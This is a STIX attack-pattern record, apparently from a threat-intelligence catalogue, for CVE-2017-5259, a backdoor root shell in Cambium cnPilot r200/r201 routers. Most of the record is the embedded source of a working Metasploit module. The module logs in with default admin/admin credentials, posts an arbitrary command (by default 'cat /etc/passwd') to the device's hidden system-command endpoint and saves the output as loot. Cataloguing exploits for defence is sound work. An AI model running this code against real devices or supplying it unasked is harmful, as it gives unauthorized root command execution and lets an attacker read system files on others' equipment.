{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5722e9c6-9675-46f6-988b-93f6a6ac5961",
    "created": "2024-08-14T16:23:50.499236Z",
    "modified": "2024-08-14T16:23:50.49924Z",
    "name": "\"Cambium cnPilot r200/r201 Command Execution as root\"",
    "description": " Cambium cnPilot r200/r201 device software versions 4.2.3-R4 to 4.3.3-R4, contain an undocumented, backdoor 'root' shell. This shell is accessible via a specific url, to any authenticated user. The module uses this shell to execute arbitrary system commands as 'root'. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/cnpilot_r_cmd_exec.rb",
            "external_id": "cnpilot_r_cmd_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-5259"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2017/12/19/r7-2017-25-cambium-epmp-and-cnpilot-multiple-vulnerabilities/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::CNPILOT\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => \"Cambium cnPilot r200/r201 Command Execution as 'root'\",\n        'Description' => %q{\n          Cambium cnPilot r200/r201 device software versions 4.2.3-R4 to\n          4.3.3-R4, contain an undocumented, backdoor 'root' shell. This shell is\n          accessible via a specific url, to any authenticated user. The module uses this\n          shell to execute arbitrary system commands as 'root'.\n        },\n        'Author' => [\n          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'\n        ],\n        'References' => [\n          ['CVE', '2017-5259'],\n          ['URL', 'https://www.rapid7.com/blog/post/2017/12/19/r7-2017-25-cambium-epmp-and-cnpilot-multiple-vulnerabilities/']\n        ],\n        'License' => MSF_LICENSE\n      )\n    )\n\n    register_options(\n      [\n        OptInt.new('TIMEOUT', [true, 'HTTP connection timeout', 10]),\n        Opt::RPORT(80),\t# Application may run on a different port too. Change port accordingly.\n        OptString.new('USERNAME', [false, 'A specific username to authenticate as', 'admin']),\n        OptString.new('PASSWORD', [false, 'A specific password to authenticate with', 'admin']),\n        OptString.new('CMD', [true, 'Command(s) to run', 'cat /etc/passwd'])\n      ], self.class\n    )\n\n    deregister_options('DB_ALL_CREDS', 'DB_ALL_PASS', 'DB_ALL_USERS', 'USER_AS_PASS', 'USERPASS_FILE', 'USER_FILE', 'PASS_FILE', 'BLANK_PASSWORDS', 'BRUTEFORCE_SPEED', 'STOP_ON_SUCCESS')\n  end\n\n  def run_host(_ip)\n    unless is_app_cnpilot?\n      return\n    end\n  end\n\n  # command execution happens here\n\n  def cmd_exec_run(the_cookie)\n    # Verify backdoor 'root' shell url exists\n    root_shell = (ssl ? 'https' : 'http').to_s + '://' + \"#{rhost}:#{rport}\" + '/adm/syscmd.asp'\n    print_status(\"#{rhost}:#{rport} - Checking backdoor 'root' shell...\")\n\n    res = send_request_cgi(\n      {\n        'uri' => '/adm/syscmd.asp',\n        'method' => 'GET',\n        'cookie' => the_cookie,\n        'headers' => {\n          'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'\n        }\n      }\n    )\n\n    # Now POST the command\n    if res && res.code == 200\n      uri1 = '/goform/SystemCommand'\n      inject_cmd = datastore['CMD']\n      print_good(\"#{rhost}:#{rport} - You can access the 'root' shell at: #{root_shell}\")\n      print_good(\"#{rhost}:#{rport} - Executing command - #{inject_cmd}\")\n\n      send_request_cgi(\n        {\n          'uri' => uri1,\n          'method' => 'POST',\n          'cookie' => the_cookie,\n          'headers' => {\n            'Accept' => '*/*',\n            'Accept-Language' => 'en-US,en;q=0.5',\n            'Accept-Encoding' => 'gzip, deflate',\n            'Connection' => 'keep-alive'\n          },\n          'vars_post' =>\n            {\n              'command' => inject_cmd,\n              'SystemCommandSubmit' => 'Apply'\n            }\n        }\n      )\n\n      # Results are populated in the first url, so GET it once more\n      res = send_request_cgi(\n        {\n          'uri' => '/adm/syscmd.asp',\n          'method' => 'GET',\n          'cookie' => the_cookie,\n          'headers' => {\n            'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'\n          }\n        }\n      )\n\n      html = Nokogiri::HTML(res.body)\n      search_result = html.search('textarea').text\n\n      if search_result.nil?\n        print_status('Command run did not return any results or invalid command. Note that cnPilot devices only have a restricted *nix command-set.')\n      else\n        print_good(search_result.to_s)\n\n        # w00t we got l00t\n        loot_name = 'cmd-exec-log'\n        loot_type = 'text/plain'\n        loot_desc = 'Cambium cnPilot CMD Exec Results'\n        data = search_result.to_s\n        p = store_loot(loot_name, loot_type, datastore['RHOST'], data, loot_desc)\n        print_good(\"File saved in: #{p}\")\n      end\n    else\n      print_error(\"#{rhost}:#{rport} - Backdoor 'root' shell not found. Affected versions are - v4.2.3-R4 and newer. You can try to verify the shell at #{root_shell}\")\n      return\n    end\n  end\n\n  #\n  # Login & initiate cmd_exec_run\n  #\n\n  def run_login\n    cookie, cnpilot_version = do_login(datastore['USERNAME'], datastore['PASSWORD'])\n    if cookie == 'skip' && cnpilot_version == 'skip'\n      return\n    elsif ['4.2.3-R4', '4.3.1-R1', '4.3.2-R4', '4.3.3-R4'].include?(cnpilot_version.to_s)\n      cmd_exec_run(cookie)\n    else\n      vprint_error(\"#{rhost}:#{rport} - This software version is not vulnerable. Affected versions are - v4.2.3-R4 and newer.\")\n    end\n  end\nend\n"
}